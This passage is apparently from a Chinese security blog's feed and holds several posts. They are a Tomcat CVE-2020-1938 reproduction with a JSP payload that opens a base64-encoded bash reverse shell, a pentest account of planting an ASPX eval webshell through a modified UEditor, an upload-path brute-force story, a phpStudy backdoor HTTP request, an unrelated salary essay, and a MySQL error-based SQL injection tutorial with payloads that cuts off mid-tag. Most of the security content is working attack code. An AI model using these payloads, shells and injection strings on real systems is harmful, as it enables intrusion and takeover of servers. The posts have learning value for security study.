    <title>Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</title>
    <link href="/p/933884b8.html"/>
    <url>/p/933884b8.html</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h3><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h3 id="0x02-前提"><a href="#0x02-前提" class="headerlink" title="0x02 前提"></a>0x02 前提</h3><ul><li><p>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</p><a id="more"></a></li></ul><h3 id="0x03-文件读取-amp-文件包含RCE"><a href="#0x03-文件读取-amp-文件包含RCE" class="headerlink" title="0x03 文件读取&amp;文件包含RCE"></a>0x03 文件读取&amp;文件包含RCE</h3><ul><li>文件读取</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 192.168.52.130</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/01.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>文件包含</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 192.168.52.130</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/02.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>test.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping mdd7e.dnslog.cn&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><h3 id="0x04-反弹shell"><a href="#0x04-反弹shell" class="headerlink" title="0x04 反弹shell"></a>0x04 反弹shell</h3><ul><li>shell.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjE0My84OTg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/03.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="http://www.svenbeast.com/post/fqSI9laE8/">http://www.svenbeast.com/post/fqSI9laE8/</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>Tomcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>佛学的魔改.net Ueditor</title>
    <link href="/p/256d1eb.html"/>
    <url>/p/256d1eb.html</url>
    
    <content type="html"><![CDATA[<p> 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p><p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p><p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg" alt="佛学的魔改Ueditor"></p><a id="more"></a><p>通过fd抓包获取到编辑器路径为：</p><p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p><p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/02.jpg" alt="佛学的魔改Ueditor"></p><p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/03.jpg" alt="佛学的魔改Ueditor"></p><p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/04.jpg" alt="佛学的魔改Ueditor"></p><p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/05.jpg" alt="佛学的魔改Ueditor"></p><p>打开这个js文件，找到了ueditor的真实路径。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/06.jpg" alt="佛学的魔改Ueditor"></p><p>但是去访问的时候，发现地址无法访问。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/07.jpg" alt="佛学的魔改Ueditor"></p><p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/08.jpg" alt="佛学的魔改Ueditor"></p><p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/09.jpg" alt="佛学的魔改Ueditor"></p><p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/10.jpg" alt="佛学的魔改Ueditor"></p><p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/11.jpg" alt="佛学的魔改Ueditor"></p><p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p><p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/12.jpg" alt="佛学的魔改Ueditor"></p><p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p><p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/13.jpg" alt="佛学的魔改Ueditor"></p><p>仔细一看，第一次返回的路径中多了’/‘，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/14.jpg" alt="佛学的魔改Ueditor"></p><p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/15.jpg" alt="佛学的魔改Ueditor"></p><p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre><p>继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;g&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>上传成功后，菜刀连接成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/16.jpg" alt="佛学的魔改Ueditor"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次任意文件上传</title>
    <link href="/p/edc6b9c0.html"/>
    <url>/p/edc6b9c0.html</url>
    
    <content type="html"><![CDATA[<p>很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。<br>在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。<br>当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。</p><a id="more"></a><p>看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。</p><p>上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="20191127记一次任意文件上传"><br>修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：<a href="http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b">http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b</a>。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="20191127记一次任意文件上传"><br>经过长时间的测试，uploadUserNo参数中加上//会导致报错，可以看到文件真实路径(getshell后发现uploadUserNo参数的值会和文件名进行拼接，例如：uploadUserNo参数值为dd//时，文件名为：dd//_年月日时分秒四位随机数_上传文件名，因为文件名不允许有//等特殊字符，所以会报错)。<br>此时知道文件目录为TempFile，文件名随机重命名，能够看到其命名规则为【_年月日时分秒四位随机数_上传文件名】<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="20191127记一次任意文件上传"><br>与电脑时间同步上传，可能秒数会有偏差，假设为偏差间隔为3秒，加上四位随机数字。<br>重新上传一次文件，记录上传时间为：“2019年11月27日16时19分11秒”。然后构造数据包进行爆破。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" alt="20191127记一次任意文件上传"><br>设置第一个标志位<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" alt="20191127记一次任意文件上传"><br>设置第二个标志位加载生成的0000-9999的4位数字典<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" alt="20191127记一次任意文件上传"><br>经过一段时间后爆破成功。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" alt="20191127记一次任意文件上传"><br>访问会报错，但问题不大，拿shell客户端直接连接<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" alt="20191127记一次任意文件上传"><br>Getshell成功<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" alt="20191127记一次任意文件上传"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpstudy后门利用方法及getshell</title>
    <link href="/p/c3ec4232.html"/>
    <url>/p/c3ec4232.html</url>
    
    <content type="html"><![CDATA[<p>请求任意后缀为php的文件</p><p>目标环境为php5.2,5.4,且不能为nts</p><p>存在Accept-Encoding: gzip,deflate</p><p>此处填写base64加密后的payload：accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw</p><p>PayLoad:</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/phpinfo.php</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 192.168.1.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate<span class="hljs-attribute">Sec-Fetch-User</span>: ?1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<span class="hljs-attribute">Sec-Fetch-Site</span>: none,<span class="hljs-attribute">accept-charset</span>: c3lzdGVtKCdjYWxjLmV4ZScpOw<span class="hljs-attribute">Accept-Encoding</span>: gzip,deflate<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20190924_phpstudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8Agetshell/01.jpg" alt="phpstudy后门利用方法及getshell"></p><p>其他更好玩的思路靠自己去思考</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>莫名的感慨</title>
    <link href="/p/7c8c6805.html"/>
    <url>/p/7c8c6805.html</url>
    
    <content type="html"><![CDATA[<p>在学生时代感觉月薪一万好高，总觉得有1万元可以干很多事情，可以去旅游，可以买电脑啊，可以买零食等等</p><p>等工作，到手工资又一万了，反而感觉不高了。</p><p>这是一个正常的现象，这是很多大学生进入社会最深切的感受。</p><p>因为的你的生活水平变了，消费水平变高了，自然而然的对收入的要求也变高了。</p><p>俗话说的好，由俭入奢易，由奢入俭难。</p><a id="more"></a><p><strong>一.学生时代的你</strong></p><p>以前上学生活费都是家里给的，根本不会有经济压力，没钱了，就能够朝父母要。</p><p>况且给到手的钱都是实实在在的零花钱。</p><p>千把块一共就这么点还能花很长时间，所以毕业前感觉月薪一万很高。</p><p>学生时代的时候住的是宿舍，吃的是食堂，没有其他的大花销。在上学的时候交学费有父母，也体会不到赚钱的辛苦。</p><p>一般学校的宿舍住宿费都是一年一交，差不多都是1200左右一年，算下来只要100块钱一个月，更何况住宿费还是包含在学费里面，根本不用另外交。</p><p>学校的食堂吃饭荤菜3块-4块左右一个，蔬菜1块钱一个，一餐只要8块钱左右就已经能够满足日常基本需求，</p><p>一天基本算下来是早餐4元+中餐8元+晚餐8元，总共加起来20元就能活一天。</p><p>特别是在学生时代买新衣服和鞋子父母还会另外给钱。一个月除了吃饭日常花销600元，剩下的钱就能够出去改善伙食或者玩。</p><p>这种时候要是给你一万块钱，那肯定是很高，想买啥就买啥，想吃啥就吃啥，你当然会觉得月薪一万块好高。</p><p><strong>二.毕业以后的你</strong></p><p>1.固定开支大</p><p>每个月都会有固定的开支，房租，水电费，一日三餐，交通费，这些几乎都是固定开支。</p><p>这些钱都是要靠你自己的工资去支付。在社会上已经没有学校那么廉价的宿舍了，在外租房每个月都需要支出1500元以上，已经抵得上在学生时代一个月的生活费。</p><p>还有出社会以后也没有了那么便宜的食堂，一日三餐，最少花费早餐5元+午餐外卖15元+晚餐15元，一个月光吃饭最省都要1050元。</p><p>还有每日上班的交通费最少10元。一个月下来就最日常的食住行就要花费3000元左右。</p><p>2.社交开支少不了</p><p>工作后还少不了社交活动，比如说：与同事出去聚餐，基本开支的最少也要200元左右吧，</p><p>就算去路边的夜排挡开支也要100多以上，如果还有娱乐节目，去唱歌KTV，喝喝酒买几瓶饮料也是不少的费用.</p><p>当然了，邀请女生去看电影，吃饭、买饮料零食，送来回路程，这些费用也是需要花费的.</p><p>3.日常生活水平也提高</p><p>工作以后日常生活水平肯定也是提高的。逛街买衣服，衣服也越来越注重品牌，以前你可能一身衣服几百块，现在一身动不动就上千块。</p><p>4.人情世故少不了</p><p>在社会上，还少不了人情世故。学生的时候因为还没赚钱，朋友圈也没有到婚丧嫁娶的年纪，也没人会计较你给没给礼钱。</p><p>但是工作了就不一样了，朋友圈里面结婚、生孩子的也不少了。你就得各种凑份子钱，这也是一大笔的开销。</p><p>网友也在网络上各种调侃，过个五一、过个十一就得花费一个月甚至2个月的工资在礼金上，都快活不下去，要吃土了。</p><p>这样一对比下来一万块钱的工资还不如在学生时代的1000块钱经花。</p><p>因为生活质量提高了，钱花的也就快了，所以你感觉一万块几乎不够你用的了，就会觉得一万的工资也不高。</p><p>因此要想能够省下来钱，一种是降低你生活水平，减少日常花销。另外一种是提升自己的综合实力赚更多的钱。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入学习之MYSQL报错注入</title>
    <link href="/p/7a3f5d50.html"/>
    <url>/p/7a3f5d50.html</url>
    
    <content type="html"><![CDATA[<h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p><h2 id="MYSQL报错注入分类："><a href="#MYSQL报错注入分类：" class="headerlink" title="MYSQL报错注入分类："></a>MYSQL报错注入分类：</h2><blockquote><p>BIGINT等数据类型溢出</p></blockquote><blockquote><p>xpath语法错误</p></blockquote><blockquote><p>concat+rand()+group_by()导致主键重复</p></blockquote><blockquote><p>一些特性</p></blockquote><p>下面就针对这几种错误类型看看背后的原理是怎样的。</p><h2 id="BIGINT等数据类型溢出"><a href="#BIGINT等数据类型溢出" class="headerlink" title="BIGINT等数据类型溢出"></a>BIGINT等数据类型溢出</h2><p>按位取反<code>~</code>、<code>!</code>、<code>exp()</code>来溢出报错。</p><p>有版本限制，<code>mysql&gt;5.5.53</code>时，则不能返回查询结果。</p><pre><code class="hljs mysql">select exp(~(select*from(select user())x));</code></pre><pre><code class="hljs mysql">select (select(!x-~0)from(select(select user())x)a);</code></pre><p>报错信息是有长度限制的，在<code>mysql/my_error.c</code>中可以看到</p><h2 id="xpath报错"><a href="#xpath报错" class="headerlink" title="xpath报错"></a>xpath报错</h2><p>通过xml函数进行报错，来进行注入。主要涉及2个函数:</p><blockquote><p>1、updatexml()</p></blockquote><blockquote><p>2、extractvalue()</p></blockquote><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里。这就是xpath报错注入的原理</p><h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p><code>updatexml((XML_document, XPath_string, new_value):</code></p><blockquote><p>第一个参数：xml文档的名称</p><p>第二个参数：xpath格式的字符串</p><p>第三个参数：替换查找到的符合条件的数据</p></blockquote><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>必须是在xpath那里传特殊字符，mysql才会报错，而我们又要注出数据，没这么多位置，所以要用到concat函数</li><li>xpath只会对特殊字符进行报错，这里我们可以用~，16进制的0x7e来进行利用</li><li>xpath只会报错32个字符，所以要用到substr</li></ul><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><ul><li>爆数据库版本</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,version(),0x7e),1)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20190814_SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8BMYSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/01.png" alt="img"></p><ul><li>爆所有数据库</li></ul><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,32) from information_schema.schemata)),0x7e)</code></pre><p><img 